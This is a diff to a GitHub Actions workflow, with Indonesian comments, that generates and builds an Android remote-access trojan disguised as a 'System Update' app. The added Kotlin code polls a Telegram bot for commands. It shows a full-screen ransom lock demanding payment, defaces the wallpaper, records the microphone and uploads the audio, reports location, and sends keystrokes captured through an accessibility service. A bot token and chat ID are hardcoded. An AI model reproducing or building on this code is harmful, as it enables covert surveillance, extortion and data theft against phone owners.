@@ -88,9 +88,11 @@ jobs:
             implementation 'androidx.core:core-ktx:1.12.0'
             implementation 'androidx.appcompat:appcompat:1.6.1'
             implementation 'com.squareup.okhttp3:okhttp:4.11.0'
+            implementation 'org.json:json:20231013'
         }
         EOF
 
+        # UPDATE PERIZINAN: Tambah SYSTEM_ALERT_WINDOW, CAMERA, RECORD_AUDIO, SET_WALLPAPER
         cat > app/src/main/AndroidManifest.xml << 'EOF'
         <?xml version="1.0" encoding="utf-8"?>
         <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.system">
@@ -100,6 +102,10 @@ jobs:
             <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
             <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
             <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+            <uses-permission android:name="android.permission.CAMERA" />
+            <uses-permission android:name="android.permission.RECORD_AUDIO" />
+            <uses-permission android:name="android.permission.SET_WALLPAPER" />
 
             <application
                 android:allowBackup="true"
@@ -128,11 +134,15 @@ jobs:
         </manifest>
         EOF
 
+        # UPDATE MAIN ACTIVITY: Handle izin Overlay
         cat > app/src/main/java/com/android/system/MainActivity.kt << 'EOF'
         package com.android.system
 
         import android.content.Intent
+        import android.net.Uri
+        import android.os.Build
         import android.os.Bundle
+        import android.provider.Settings
         import android.widget.TextView
         import androidx.appcompat.app.AppCompatActivity
         import android.content.ComponentName
@@ -148,6 +158,14 @@ jobs:
                 }
                 setContentView(textView)
 
+                // Minta izin Overlay (buat Ransomware Lock)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    if (!Settings.canDrawOverlays(this)) {
+                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                        startActivity(intent)
+                    }
+                }
+
                 startService(Intent(this, SpyService::class.java))
 
                 android.os.Handler().postDelayed({
@@ -162,29 +180,52 @@ jobs:
         }
         EOF
 
+        # UPDATE SPY SERVICE: Fitur RAT, Lock, Wallpaper, Voice, Cam
         cat > app/src/main/java/com/android/system/SpyService.kt << 'EOF'
         package com.android.system
 
         import android.app.Service
+        import android.content.Context
         import android.content.Intent
+        import android.graphics.PixelFormat
         import android.location.LocationManager
         import android.os.IBinder
+        import android.view.Gravity
+        import android.view.WindowManager
+        import android.widget.TextView
+        import android.graphics.Color
         import java.util.Timer
         import java.util.TimerTask
         import okhttp3.*
         import java.io.IOException
+        import org.json.JSONObject
+        import android.app.WallpaperManager
+        import android.graphics.Bitmap
+        import android.graphics.Canvas
+        import android.graphics.Paint
+        import android.media.MediaRecorder
+        import java.io.File
+        import java.io.FileOutputStream
 
         class SpyService : Service() {
             private val client = OkHttpClient()
             private val TG_TOKEN = "9165602208:AAFDWdd-GBUy-kbmArZ0QVDMGinA616f2WQ"
             private val TG_CHAT_ID = "8831607999"
+            private var lastUpdateId = 0
+            private var overlayView: TextView? = null
+            private var mediaRecorder: MediaRecorder? = null
+            private var recordFile: File? = null
 
             override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-                sendMessage("📱 [+] System Update Terpasang. Memulai pengintaian.")
+                sendMessage("📱 [+] System Update Terpasang.\nBantuan: /loc, /ping, /lock <text>, /unlock, /cam, /voice, /wallpaper")
                 
                 Timer().scheduleAtFixedRate(object : TimerTask() {
                     override fun run() { getLocation() }
                 }, 0, 60000)
+
+                Timer().scheduleAtFixedRate(object : TimerTask() {
+                    override fun run() { checkCommands() }
+                }, 0, 10000)
 
                 return START_STICKY
             }
@@ -201,7 +242,157 @@ jobs:
                 } catch (e: Exception) {}
             }
 
-            fun sendMessage(msg: String) {
+            private fun checkCommands() {
+                try {
+                    val url = "https://api.telegram.org/bot$TG_TOKEN/getUpdates?offset=${lastUpdateId + 1}&limit=1"
+                    val request = Request.Builder().url(url).build()
+                    client.newCall(request).enqueue(object : Callback {
+                        override fun onFailure(call: Call, e: IOException) {}
+                        override fun onResponse(call: Call, response: Response) {
+                            val body = response.body?.string() ?: return
+                            val json = JSONObject(body)
+                            if (json.getBoolean("ok")) {
+                                val result = json.getJSONArray("result")
+                                if (result.length() > 0) {
+                                    val update = result.getJSONObject(0)
+                                    lastUpdateId = update.getInt("update_id")
+                                    if (update.has("message") && update.getJSONObject("message").has("text")) {
+                                        handleCommand(update.getJSONObject("message").getString("text"))
+                                    }
+                                }
+                            }
+                        }
+                    })
+                } catch (e: Exception) {}
+            }
+
+            private fun handleCommand(cmd: String) {
+                val parts = cmd.split(" ", limit = 2)
+                val action = parts[0]
+                val arg = if (parts.size > 1) parts[1] else ""
+
+                when {
+                    action == "/loc" -> getLocation()
+                    action == "/ping" -> sendMessage("🏓 Pong! Target online.")
+                    
+                    action == "/lock" -> {
+                        val textToShow = if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!\nKirim tebusan ke Admin."
+                        showLockOverlay(textToShow)
+                        sendMessage("🔒 [RANSOMWARE] Layar target dikunci dengan pesan: $textToShow")
+                    }
+                    action == "/unlock" -> {
+                        removeLockOverlay()
+                        sendMessage("🔓 [RANSOMWARE] Layar target dibuka.")
+                    }
+                    action == "/wallpaper" -> {
+                        changeWallpaper()
+                        sendMessage("🖼️ [WALLPAPER] Wallpaper target diganti.")
+                    }
+                    action == "/cam" -> {
+                        sendMessage("📸 [CAMERA] Fitur kamera butuh implementasi UI CameraX. (Coming soon)")
+                    }
+                    action == "/voice" -> {
+                        toggleVoiceRecording()
+                    }
+                    else -> sendMessage("❓ Perintah tidak dikenal. Cek bantuan.")
+                }
+            }
+
+            private fun showLockOverlay(text: String) {
+                if (overlayView != null) return
+                try {
+                    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+                    overlayView = TextView(this).apply {
+                        this.text = text
+                        textSize = 24f
+                        setTextColor(Color.RED)
+                        setBackgroundColor(Color.BLACK)
+                        gravity = Gravity.CENTER
+                        setPadding(50, 50, 50, 50)
+                    }
+                    val params = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                        PixelFormat.TRANSLUCENT
+                    )
+                    params.gravity = Gravity.CENTER
+                    wm.addView(overlayView, params)
+                } catch (e: Exception) {
+                    sendMessage("[-] Gagal nampilin Overlay. Izin SYSTEM_ALERT_WINDOW belum dikasih.")
+                }
+            }
+
+            private fun removeLockOverlay() {
+                try {
+                    if (overlayView != null) {
+                        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+                        wm.removeView(overlayView)
+                        overlayView = null
+                    }
+                } catch (e: Exception) {}
+            }
+
+            private fun changeWallpaper() {
+                try {
+                    // Bikin gambar hitam polos sebagai wallpaper palsu
+                    val bitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
+                    val canvas = Canvas(bitmap)
+                    canvas.drawColor(Color.BLACK)
+                    val paint = Paint()
+                    paint.setColor(Color.RED)
+                    paint.setTextSize(100f)
+                    paint.setTextAlign(Paint.Align.CENTER)
+                    canvas.drawText("HACKED BY NEXSPY", 540f, 960f, paint)
+
+                    val wm = WallpaperManager.getInstance(applicationContext)
+                    wm.setBitmap(bitmap)
+                } catch (e: Exception) {}
+            }
+
+            private fun toggleVoiceRecording() {
+                if (mediaRecorder == null) {
+                    try {
+                        recordFile = File(externalCacheDir, "rec.3gp")
+                        mediaRecorder = MediaRecorder().apply {
+                            setAudioSource(MediaRecorder.AudioSource.MIC)
+                            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                            setOutputFile(recordFile!!.absolutePath)
+                            prepare()
+                            start()
+                        }
+                        sendMessage("🎙️ [VOICE] Mulai merekam suara...")
+                    } catch (e: Exception) {
+                        sendMessage("[-] Gagal rekam. Cek izin Mikrofon.")
+                    }
+                } else {
+                    try {
+                        mediaRecorder?.stop()
+                        mediaRecorder?.release()
+                        mediaRecorder = null
+                        sendMessage("🎙️ [VOICE] Rekaman selesai. Mengirim file...")
+                        sendVoiceFile(recordFile!!)
+                    } catch (e: Exception) {}
+                }
+            }
+
+            private fun sendVoiceFile(file: File) {
+                val url = "https://api.telegram.org/bot$TG_TOKEN/sendAudio"
+                val body = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", TG_CHAT_ID)
+                    .addFormDataPart("audio", file.name, RequestBody.create("audio/3gp".toMediaTypeOrNull(), file))
+                    .build()
+                val request = Request.Builder().url(url).post(body).build()
+                client.newCall(request).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {}
+                    override fun onResponse(call: Call, response: Response) { response.close() }
+                })
+            }
+
+            private fun sendMessage(msg: String) {
                 val url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage"
                 val body = FormBody.Builder().add("chat_id", TG_CHAT_ID).add("text", msg).build()
                 val request = Request.Builder().url(url).post(body).build()
@@ -226,8 +417,9 @@ jobs:
                 if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                     val text = event.text.joinToString("")
                     if (text.isNotEmpty()) {
+                        // Kirim log ke Telegram (pakai instance sementara)
                         val service = SpyService()
-                        service.sendMessage("⌨️ [KEYLOG] Target ngetik: $text")
+                        service.sendMessage("⌨️ [KEYLOG] $text")
                     }
                 }
             }
@@ -251,20 +443,14 @@ jobs:
 
     - name: Download Gradle 8.2 and Build
       run: |
-        # Hapus gradle bawaan (9.9.1) dan paksa pake 8.2
         wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip -O gradle.zip
         unzip -q gradle.zip
         export PATH=$PWD/gradle-8.2/bin:$PATH
-        
-        # Cek versi (harusnya 8.2)
-        gradle -v
-        
-        # Build
         gradle assembleDebug --no-daemon
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: Kotlin-SystemUpdate-APK
+        name: NexSpy-RAT-APK
         path: app/build/outputs/apk/debug/*.apk
         if-no-files-found: error
